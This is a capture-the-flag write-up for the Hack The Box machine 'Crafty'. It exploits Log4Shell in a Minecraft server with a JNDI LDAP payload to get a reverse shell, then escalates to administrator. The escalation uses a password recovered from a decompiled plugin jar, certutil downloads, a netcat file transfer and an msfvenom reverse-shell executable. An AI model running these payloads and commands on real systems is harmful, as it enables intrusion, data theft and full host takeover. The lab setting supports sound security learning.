---
title: HTB-Crafty
draft: false
tags:
  - htb
  - windows
  - easy
  - minecraft
  - log4j
  - tlauncher
  - runascs
  - jd-gui
  - jar
---
![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/crafty/Crafty.png)

## Information Gathering
### Rustscan

Rustscan finds port 80 and 25565 open:

`rustscan --addresses 10.10.11.249 --range 1-65535`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/crafty/image-2.png)

Let's enumerate further using nmap.

Nmap shows that Minecraft 1.16.5 is running on port 25565. 

`sudo nmap -sVC -p 80,25565 crafty.htb`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/crafty/image-3.png)

## Enumeration
### HTTP - TCP 80

After adding **crafty.htb** to `/etc/hosts`, we can access the website:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/crafty/image.png)

There is **Play.crafty.htb** at the bottom of the page. Let's add it to `/etc/hosts` as well. 
### TCP 25565

We tried accessing Minecraft through web browser but nothing happened:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/crafty/image-1.png)

We will need some sort of platform to interact with minecraft server. 

## Shell as svc_minecraft
### Log4j

Searching for exploits regarding **Minecraft 1.16.5**, it is pretty apparent that it is vulnerable to **Log4j**:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/crafty/image-4.png)

Let's follow [this article](https://software-sinner.medium.com/exploiting-minecraft-servers-log4j-ddac7de10847) and reproduce the exploitation steps.

We will first download [TLauncher](https://tlauncher.org/), we could be used to make interaction with Minecraft server:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/crafty/image-11.png)

After download the zip file, let's spin up the software using java:

`sudo java -jar TLauncher.jar`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/crafty/image-5.png)

Let's correctly set up our version to **1.16.5** and make install:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/crafty/image-6.png)

Entering the game, we are prompted with the default minecraft page:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/crafty/image-7.png)

Let's click on **Multiplayer** and we are given with the page to choose network connections:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/crafty/image-8.png)

We will click on **Direct Connection** and use the server address **play.crafty.htb**:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/crafty/image-9.png)

We now have access to the game:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/crafty/image-10.png)

Let's use [this payload](https://github.com/kozmer/log4j-shell-poc) to spawn a reverse shell. 

Upon download, we have modify the script a bit so that it will execute **cmd.exe** instead of **bash**:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/crafty/image-12.png)

Le't run the exploit with netcat listener setup and listening at port 4444:

`sudo python3 poc.py --userip 10.10.14.36 --webport 80 --lport 4444`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/crafty/image-13.png)

On game screen, type `t` and copy paste the following payload provided from the exploit above:

`${jndi:ldap://10.10.14.36:1389/a}`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/crafty/image-15.png)

Almost immediately, we are given with the shell as **svc_minecraft**:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/crafty/image-14.png)

## Privesc: svc_minecraft to administrator

### jar file

Enumerating around the file system, we see **playercounter-1.0-SNAPSHOT.jar** file:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/crafty/image-16.png)

It looks interesting. Let's download it and enumerate it. 

We will first pass over **nc.exe** to the target system using Python webserver and Certutil:

`python3 -m http.server 1234`

`certutil.exe -urlcache -split -f http://10.10.14.36:1234/nc.exe`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/crafty/image-17.png)

Let's use **nc.exe** to transfer the file over to local netcat listener:

`.\nc.exe 10.10.14.36 1235 < c:\Users\svc_minecraft\server\plugins\playercounter-1.0-SNAPSHOT.jar

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/crafty/image-18.png)

There is netcat receiver running locally:

`sudo nc -lp 1235 > playercounter-1.0-SNAPSHOT.jar`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/crafty/image-19.png)


### JD-GUI

Now that we have downloaded the file, let's take a look into it using **jd-gui**:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/crafty/image-20.png)

Inside **Playercounter.class**, password is revealed: **s67u84zKq8IXw**

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/crafty/image-21.png)

This could be the password for the administrator. Let's find out. 

### RunasCs

We will upload **RunasCs.exe** using certutil:

`certutil.exe -urlcache -split -f http://10.10.14.36:1234/RunasCs.exe`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/crafty/image-22.png)

Let's create a reverse shell payload in exe that we will use it with RunasCs:

`msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.36 LPORT=1337 -f exe > rev.exe`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/crafty/image-23.png)

We will upload generated **rev.exe** as well:

`certutil.exe -urlcache -split -f http://10.10.14.36:1234/rev.exe`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/crafty/image-24.png)

Using RunasCs, we can run **rev.exe** as the administrator:

`.\RunasCs.exe administrator s67u84zKq8IXw ".\rev.exe"  `

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/crafty/image-25.png)

We have a shell as the administrator now:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/crafty/image-26.png)


## References
- https://nvd.nist.gov/vuln/detail/CVE-2021-44228
- https://software-sinner.medium.com/exploiting-minecraft-servers-log4j-ddac7de10847
- https://tlauncher.org/
- https://github.com/kozmer/log4j-shell-poc


